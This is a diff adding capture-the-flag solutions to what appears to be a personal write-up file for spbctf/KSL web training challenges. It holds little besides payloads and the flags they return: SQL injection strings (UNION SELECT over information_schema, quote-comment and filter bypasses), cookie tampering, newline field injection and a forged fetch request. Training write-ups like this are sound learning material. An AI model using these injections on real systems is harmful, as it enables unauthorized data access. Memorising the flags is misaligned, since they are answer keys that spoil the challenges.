@@ -892,9 +892,58 @@ X-Powered-By: PHP/5.5.9-1ubuntu4.21
  
 Done! Flag: KSL{a3908a69183647a1e68e515b6e52880a}
 
-###
-...
-###
+24) https://intro.spbctf.com/soeasy/
+
+dev js console
+
+---
+
+fetch('https://intro.spbctf.com/soeasy/?view_flag=yes', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'fake=no'}).then(res => res.text()).then(data => console.log(data))
+
+->
+
+spbctf{r3st_c1i3n7_1s_th3_b35t_w4y}
+
+25) https://intro.spbctf.com/header/
+
+GET /header/ HTTP/2
+Host: intro.spbctf.com
+
+->
+
+Headers:
+Flag: spbctf{h34d3r_id_th3_b3s7_w4y}
+
+26) https://intro.spbctf.com/cookie1/
+
+GET /cookie1/ HTTP/2
+Host: intro.spbctf.com
+
+->
+
+change cookie admin=1
+
+---
+
+spbctf{i_l0v3_c00k13}
+
+27) https://intro.spbctf.com/cookie2/
+
+GET /cookie1/ HTTP/2
+Host: intro.spbctf.com
+Cookie: test0=test0; test1=test1; test2=test2; test3=test3; test4=test4; test5=test5; test6=test6; test7=test7; test8=test8; test9=test9; test10=test10; test11=test11; test12=test12; test13=test13; test14=test14; test15=test15; test16=test16; test17=test17; test18=test18; test19=test19; test20=test20; test21=test21; test22=test22; test23=test23; test24=test24; test25=test25; test26=test26; test27=test27; test28=test28; test29=test29; test30=test30; test31=test31; test32=test32; test33=test33; test34=test34; test35=test35; test36=test36; test37=test37; test38=test38; test39=test39; test40=test40; test41=test41; test42=test42; test43=test43; test44=test44; test45=test45; test46=test46; test47=test47; test48=test48; test49=test49; test50=test50; test51=test51; test52=test52; test53=test53; test54=test54; test55=test55; test56=test56; test57=test57; test58=test58; test59=test59; test60=test60; test61=test61; test62=test62; test63=test63; test64=test64; test65=test65; test66=test66; test67=test67; test68=test68; test69=test69; test70=test70; test71=test71; test72=test72; test73=test73; test74=test74; test75=test75; test76=test76; test77=test77; test78=test78; test79=test79; test80=test80; test81=test81; test82=test82; test83=test83; test84=test84; test85=test85; test86=test86; test87=test87; test88=test88; test89=test89; test90=test90; test91=test91; test92=test92; test93=test93; test94=test94; test95=test95; test96=test96; test97=test97; test98=test98; test99=test99;
+
+->
+
+spbctf{1_l0v3_c00ki3s}
+
+28) https://intro.spbctf.com/ua/
+
+change browser agent and save cookie
+
+->
+
+spbctf{1e3c92f09071da7126a580a2e0408879}
 
 29) https://2019-10-13-cmdinj.ctf.su/task/ping
  
@@ -1035,3 +1084,111 @@ KSL{c21625af357afa5cc6b64f901fe41729}
 ->
 
 KSL{9761d20b000c82c5b974f3b744d3d529}
+
+42) https://kslweb3.spb.ctf.su/2-3/
+
+?sender=me&receiver=admin&amount=100&comment=test%0a%20%20sender:%20admin%0a%20%20receiver:%20me%0a%20%20amount:%20999999%0a%20%20comment:%20flag
+
+->
+
+KSL{4403ee8cd237d9f9b15021ea07608725}
+
+43) https://2019-10-20-sqlinj.ctf.su/kurome
+
+a' UNION SELECT 1, 2, 3, TABLE_NAME from information_schema.TABLES -- 
+
+->
+
+tables...
+
+---
+
+a' UNION SELECT 1, 2, 3, secret from girls -- 
+
+->
+
+spbctf{i_l0ve_cookies_and_sist3r}
+
+44) https://2019-10-20-sqlinj.ctf.su/yuno
+
+1' UNION SELECT 1, 2, 3, secret from girls where name = 'Yuno Gasai' -- 
+
+->
+
+spbctf{I_w@nt_to_kill_y0u!!}
+
+45) https://2019-10-20-sqlinj.ctf.su/lina
+
+Lina' -- 
+
+->
+
+spbctf{One_wh0_is_darker_than_twilight}
+
+46) https://2019-10-20-sqlinj.ctf.su/gabriel
+
+1' UNION SELECT secret from girls where name = 'Gabriel' -- 
+
+->
+
+spbctf{my_weight_is_40kg____}
+
+47) https://2019-10-20-sqlinj.ctf.su/madoka
+
+1' UNION select 1,2,(select height from girls WHERE name='Madoka'),'
+
+->
+
+-7263876
+
+->
+
+spbctf{I_am_girl_magician!!}
+
+48) https://2019-10-20-sqlinj.ctf.su/02
+
+SELeCT * FrOM girls
+
+->
+
+spbctf{mmya_____nyaaaa!}
+
+49) http://kslweb1.spb.ctf.su/sqli/gondex/
+
+TABLE_NAME from information_schema.TABLES
+
+->
+
+table_b87b13ee3f01597899d340cce7bdcc53
+
+---
+
+COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "table_b87b13ee3f01597899d340cce7bdcc53"
+
+->
+
+col_495260942655ec055f7754df54570014
+
+---
+
+col_495260942655ec055f7754df54570014 FROM table_b87b13ee3f01597899d340cce7bdcc53
+
+->
+
+spbctf{heh_you_w0n_my_3ng1n3}
+
+50) http://kslweb1.spb.ctf.su/sqli/bypass1/
+
+-1 UNION SELECT 1,22,(SELECT * FROM flag)
+
+->
+
+spbctf{f1r57_bypa55}
+
+51) http://kslweb1.spb.ctf.su/sqli/bypass2/
+
+-1 UNION SELECT 1,2,(SELECT flag FROM flags WHERE name=HEX(9110082404197645992))
+
+->
+
+spbctf{7f95f2e1d57eb5605e77a48f735e60f5}
